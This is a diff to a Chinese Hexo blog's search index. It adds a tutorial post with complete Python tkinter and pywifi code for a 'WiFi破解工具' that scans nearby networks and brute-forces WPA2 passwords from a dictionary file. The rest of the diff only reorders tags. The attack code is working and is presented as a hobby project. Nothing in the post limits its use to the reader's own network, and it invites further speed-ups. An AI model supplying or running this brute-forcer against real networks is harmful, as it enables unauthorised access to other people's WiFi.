@@ -1,6 +1,78 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Python（十）- tkinter案例(1): WiFi连接器!</title>
+    <url>/archives/6eec6899.html</url>
+    <content><![CDATA[<p>前段时间，在脉脉上看到一篇关于WiFi连接的python实现，感觉挺有意思的。</p>
+<a id="more"></a>
+<p>具体网址忘了，大概思路是利用 <code>tkinter</code> 和 <code>pywifi</code> 这两个库，搭建一个WiFi界面，通过密码文件暴力破解，并不是那种可以通过抓取空中报文，解析用户密码之类的，当然，如果有人有兴趣的话，可以去试一下。</p>
+<h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><ul>
+<li>以界面显示程序，提供连接操作；</li>
+<li>展示附近 WiFi 信号列表，可选择；</li>
+<li>用户可自定义密码文件；</li>
+<li>程序提供破解器（即自动生成随机密码）- 本文暂不考虑（其实意义不大），有兴趣的可以试试；</li>
+<li>连接测试，显示结果（账号密码）</li>
+</ul>
+<h2 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h2><ul>
+<li>利用 <code>tkinter</code> 和 <code>pywifi</code> 这两个库，搭建一个WiFi界面；</li>
+<li>扫描附近 wifi 信号；</li>
+<li>密码文件暴力破解（这里方式多样化，不固定），也可以动态创建一个密码迭代器；</li>
+<li>这里可以设定时间或次数之类的；</li>
+<li>对wifi和密码进行匹配测试</li>
+</ul>
+<h2 id="3-实现"><a href="#3-实现" class="headerlink" title="3.实现"></a>3.实现</h2><ul>
+<li>初始化与大体框架</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> ttk</span><br><span class="line"><span class="keyword">import</span> pywifi</span><br><span class="line"><span class="keyword">from</span> pywifi <span class="keyword">import</span> const</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> tkinter.filedialog</span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WiFi_GUI</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, init_window_name)</span>:</span></span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line">        <span class="comment"># 密码文件路径</span></span><br><span class="line">        self.get_value = StringVar()</span><br><span class="line">        <span class="comment"># 获取破解wifi账号</span></span><br><span class="line">        self.get_wifi_value = StringVar()</span><br><span class="line">        <span class="comment"># 获取wifi密码</span></span><br><span class="line">        self.get_wifimm_value = StringVar()</span><br><span class="line">        self.wifi = pywifi.PyWiFi()</span><br><span class="line">        <span class="comment"># 抓取网卡接口</span></span><br><span class="line">        self.iface = self.wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 抓取第一个无线网卡</span></span><br><span class="line">        self.iface.disconnect()  <span class="comment"># 测试链接断开所有链接</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># 休眠1秒#测试网卡是否属于断开状态</span></span><br><span class="line">        <span class="keyword">assert</span> self.iface.status() <span class="keyword">in</span> [</span><br><span class="line">            const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(WIFI:%s,%s)'</span> % (self.wifi, self.iface.name())</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>设置窗口</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WiFi_GUI</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_init_window</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.init_window_name.title(<span class="string">"WIFI破解工具"</span>)</span><br><span class="line">        self.init_window_name.geometry(<span class="string">'+500+200'</span>)</span><br><span class="line">        labelframe = LabelFrame(width=<span class="number">400</span>, height=<span class="number">200</span>, text=<span class="string">"配置"</span>)</span><br><span class="line">        labelframe.grid(column=<span class="number">0</span>, row=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">10</span>)</span><br><span class="line">        self.search = Button(labelframe, text=<span class="string">"搜索附近WiFi"</span>,</span><br><span class="line">                             command=self.scans_wifi_list).grid(column=<span class="number">0</span>, row=<span class="number">0</span>)</span><br><span class="line">        self.pojie = Button(labelframe, text=<span class="string">"开始破解"</span>,</span><br><span class="line">                            command=self.readPassWord).grid(column=<span class="number">1</span>, row=<span class="number">0</span>)</span><br><span class="line">        self.label = Label(labelframe, text=<span class="string">"目录路径："</span>).grid(column=<span class="number">0</span>, row=<span class="number">1</span>)</span><br><span class="line">        self.path = Entry(labelframe, width=<span class="number">12</span>,</span><br><span class="line">                          textvariable=self.get_value).grid(column=<span class="number">1</span>, row=<span class="number">1</span>)</span><br><span class="line">        self.file = Button(labelframe, text=<span class="string">"添加密码文件目录"</span>,</span><br><span class="line">                           command=self.add_mm_file).grid(column=<span class="number">2</span>, row=<span class="number">1</span>)</span><br><span class="line">        self.wifi_text = Label(</span><br><span class="line">            labelframe, text=<span class="string">"WiFi账号："</span>).grid(column=<span class="number">0</span>, row=<span class="number">2</span>)</span><br><span class="line">        self.wifi_input = Entry(</span><br><span class="line">            labelframe, width=<span class="number">12</span>, textvariable=self.get_wifi_value).grid(column=<span class="number">1</span>, row=<span class="number">2</span>)</span><br><span class="line">        self.wifi_mm_text = Label(</span><br><span class="line">            labelframe, text=<span class="string">"WiFi密码："</span>).grid(column=<span class="number">2</span>, row=<span class="number">2</span>)</span><br><span class="line">        self.wifi_mm_input = Entry(labelframe, width=<span class="number">10</span>, textvariable=self.get_wifimm_value).grid(</span><br><span class="line">            column=<span class="number">3</span>, row=<span class="number">2</span>, sticky=W)</span><br><span class="line">        self.wifi_labelframe = LabelFrame(text=<span class="string">"wifi列表"</span>)</span><br><span class="line">        self.wifi_labelframe.grid(column=<span class="number">0</span>, row=<span class="number">3</span>, columnspan=<span class="number">4</span>, sticky=NSEW)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 定义树形结构与滚动条</span></span><br><span class="line">        self.wifi_tree = ttk.Treeview(</span><br><span class="line">            self.wifi_labelframe, show=<span class="string">"headings"</span>, columns=(<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>, <span class="string">"d"</span>))</span><br><span class="line">        self.vbar = ttk.Scrollbar(</span><br><span class="line">            self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)</span><br><span class="line">        self.wifi_tree.configure(yscrollcommand=self.vbar.set)</span><br><span class="line">        <span class="comment"># 表格的标题</span></span><br><span class="line">        self.wifi_tree.column(<span class="string">"a"</span>, width=<span class="number">50</span>, anchor=<span class="string">"center"</span>)</span><br><span class="line">        self.wifi_tree.column(<span class="string">"b"</span>, width=<span class="number">100</span>, anchor=<span class="string">"center"</span>)</span><br><span class="line">        self.wifi_tree.column(<span class="string">"c"</span>, width=<span class="number">100</span>, anchor=<span class="string">"center"</span>)</span><br><span class="line">        self.wifi_tree.column(<span class="string">"d"</span>, width=<span class="number">100</span>, anchor=<span class="string">"center"</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">"a"</span>, text=<span class="string">"WiFiID"</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">"b"</span>, text=<span class="string">"SSID"</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">"c"</span>, text=<span class="string">"BSSID"</span>)</span><br><span class="line">        self.wifi_tree.heading(<span class="string">"d"</span>, text=<span class="string">"signal"</span>)</span><br><span class="line">        self.wifi_tree.grid(row=<span class="number">4</span>, column=<span class="number">0</span>, sticky=NSEW)</span><br><span class="line">        self.wifi_tree.bind(<span class="string">"&lt;Double-1&gt;"</span>, self.onDBClick)</span><br><span class="line">        self.vbar.grid(row=<span class="number">4</span>, column=<span class="number">1</span>, sticky=NS)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>搜索/显示wifi</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WiFi_GUI</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 搜索wifi</span></span><br><span class="line">    <span class="comment"># cmd /k C:\python\python36\python.exe "$(FULL_CURRENT_PATH)" &amp; PAUSE &amp; EXIT</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">scans_wifi_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 扫描周围wifi列表#开始扫描</span></span><br><span class="line">        print(<span class="string">"^_^ 开始扫描附近wifi..."</span>)</span><br><span class="line">        self.iface.scan()</span><br><span class="line">        time.sleep(<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># 在若干秒后获取扫描结果</span></span><br><span class="line">        scanres = self.iface.scan_results()</span><br><span class="line">        <span class="comment"># 统计附近被发现的热点数量</span></span><br><span class="line">        nums = len(scanres)</span><br><span class="line">        print(<span class="string">"数量: %s"</span> % (nums))</span><br><span class="line">        <span class="comment"># print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))</span></span><br><span class="line">        <span class="comment"># 实际数据</span></span><br><span class="line">        self.show_scans_wifi_list(scanres)</span><br><span class="line">        <span class="keyword">return</span> scanres</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 显示wifi列表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_scans_wifi_list</span><span class="params">(self, scans_res)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> index, wifi_info <span class="keyword">in</span> enumerate(scans_res):</span><br><span class="line">            <span class="comment"># print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))</span></span><br><span class="line">            self.wifi_tree.insert(<span class="string">""</span>, <span class="string">'end'</span>, values=(</span><br><span class="line">                index + <span class="number">1</span>, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))</span><br><span class="line">            <span class="comment"># print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>绑定事件</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WiFi_GUI</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># Treeview绑定事件</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">onDBClick</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        self.sels = event.widget.selection()</span><br><span class="line">        self.get_wifi_value.set(self.wifi_tree.item(self.sels, <span class="string">"values"</span>)[<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>读取密码，进行匹配</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WiFi_GUI</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 添加密码文件目录</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_mm_file</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.filename = tkinter.filedialog.askopenfilename()</span><br><span class="line">        self.get_value.set(self.filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取密码字典，进行匹配</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">readPassWord</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.getFilePath = self.get_value.get()</span><br><span class="line">        <span class="comment"># print("文件路径：%s\n" %(self.getFilePath))</span></span><br><span class="line">        self.get_wifissid = self.get_wifi_value.get()</span><br><span class="line">        <span class="comment"># print("ssid：%s\n" %(self.get_wifissid))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.getFilePath:</span><br><span class="line">            self.getFilePath = <span class="string">'misdic.txt'</span></span><br><span class="line"></span><br><span class="line">        self.pwdfilehander = open(self.getFilePath, <span class="string">"r"</span>, errors=<span class="string">"ignore"</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.pwdStr = self.pwdfilehander.readline()</span><br><span class="line">                <span class="comment"># print("密码: %s " %(self.pwdStr))</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> self.pwdStr:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)</span><br><span class="line">                <span class="comment"># print("返回值：%s\n" %(self.bool1) )</span></span><br><span class="line">                <span class="keyword">if</span> self.bool1:</span><br><span class="line">                    <span class="comment"># print("密码正确："+pwdStr)</span></span><br><span class="line">                    <span class="comment"># res = "密码:%s 正确 \n"%self.pwdStr</span></span><br><span class="line">                    self.res = <span class="string">"===正确===  wifi名:%s  匹配密码：%s "</span> % (</span><br><span class="line">                        self.get_wifissid, self.pwdStr)</span><br><span class="line">                    self.get_wifimm_value.set(self.pwdStr)</span><br><span class="line">                    tkinter.messagebox.showinfo(<span class="string">'提示'</span>, <span class="string">'破解成功！！！'</span>)</span><br><span class="line">                    print(self.res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># print("密码:"+self.pwdStr+"错误")</span></span><br><span class="line">                    self.res = <span class="string">"---错误--- wifi名:%s匹配密码：%s"</span> % (</span><br><span class="line">                        self.get_wifissid, self.pwdStr)</span><br><span class="line">                    print(self.res)</span><br><span class="line">                    time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对wifi和密码进行匹配</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(self, pwd_Str, wifi_ssid)</span>:</span></span><br><span class="line">        <span class="comment"># 创建wifi链接文件</span></span><br><span class="line">        self.profile = pywifi.Profile()</span><br><span class="line">        self.profile.ssid = wifi_ssid</span><br><span class="line">        <span class="comment"># wifi名称</span></span><br><span class="line">        self.profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line">        <span class="comment"># 网卡的开放</span></span><br><span class="line">        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line">        <span class="comment"># wifi加密算法</span></span><br><span class="line">        self.profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class="line">        <span class="comment"># 加密单元</span></span><br><span class="line">        self.profile.key = pwd_Str</span><br><span class="line">        <span class="comment"># 密码</span></span><br><span class="line">        self.iface.remove_all_network_profiles()</span><br><span class="line">        <span class="comment"># 删除所有的wifi文件</span></span><br><span class="line">        self.tmp_profile = self.iface.add_network_profile(self.profile)</span><br><span class="line">        <span class="comment"># 设定新的链接文件</span></span><br><span class="line">        self.iface.connect(self.tmp_profile)</span><br><span class="line">        <span class="comment"># 链接</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> self.iface.status() == const.IFACE_CONNECTED:</span><br><span class="line">            <span class="comment"># 判断是否连接上</span></span><br><span class="line">            isOK = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            isOK = <span class="literal">False</span></span><br><span class="line">        self.iface.disconnect()  <span class="comment"># 断开</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 检查断开状态</span></span><br><span class="line">        <span class="keyword">assert</span> self.iface.status() <span class="keyword">in</span> [</span><br><span class="line">            const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class="line">        <span class="keyword">return</span> isOK</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>启动</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gui_start</span><span class="params">()</span>:</span></span><br><span class="line">    init_window = Tk()</span><br><span class="line">    ui = WiFi_GUI(init_window)</span><br><span class="line">    print(ui)</span><br><span class="line">    ui.set_init_window()</span><br><span class="line">    ui.scans_wifi_list()</span><br><span class="line">    init_window.mainloop()</span><br><span class="line">    gui_start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    gui_start()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>显示</li>
+</ul>
+<div>
+  <img width="36%" src="/archives/6eec6899/WiFi破解工具.png">
+</div>
+
+
+<h2 id="4-优化"><a href="#4-优化" class="headerlink" title="4.优化"></a>4.优化</h2><p>优化思路主要是密码字典生成方式，线程池、进程池、密码迭代器等等，如果要做复杂的话，可以试试考虑截取空中报文。<br>具体代码就不写了，感兴趣的可以自己试试去实现。</p>
+<hr>
+]]></content>
+      <categories>
+        <category>编程</category>
+        <category>Python</category>
+        <category>GUI编程</category>
+      </categories>
+      <tags>
+        <tag>Tkinter</tag>
+        <tag>WiFi连接</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python（九）- 音频文字转换</title>
     <url>/archives/890d42a0.html</url>
     <content><![CDATA[<p>Python 是一门通用性很强的语言，本文主要讲述其中的音频模块 gtts（Google文本到语音）的使用。</p>
@@ -193,8 +265,8 @@
         <category>数据库</category>
       </categories>
       <tags>
-        <tag>MongoDB</tag>
         <tag>CURD</tag>
+        <tag>MongoDB</tag>
       </tags>
   </entry>
   <entry>
@@ -247,8 +319,8 @@
         <category>数据库</category>
       </categories>
       <tags>
-        <tag>CURD</tag>
         <tag>MySQL</tag>
+        <tag>CURD</tag>
       </tags>
   </entry>
   <entry>
@@ -945,9 +1017,9 @@
         <category>数据库</category>
       </categories>
       <tags>
-        <tag>CURD</tag>
         <tag>类继承</tag>
         <tag>MySQL</tag>
+        <tag>CURD</tag>
       </tags>
   </entry>
   <entry>
@@ -1781,8 +1853,8 @@
         <category>Hexo</category>
       </categories>
       <tags>
-        <tag>基本配置</tag>
         <tag>next</tag>
+        <tag>基本配置</tag>
       </tags>
   </entry>
   <entry>
@@ -3306,8 +3378,8 @@
         <category>Hexo</category>
       </categories>
       <tags>
-        <tag>yilia</tag>
         <tag>基本配置</tag>
+        <tag>yilia</tag>
       </tags>
   </entry>
   <entry>
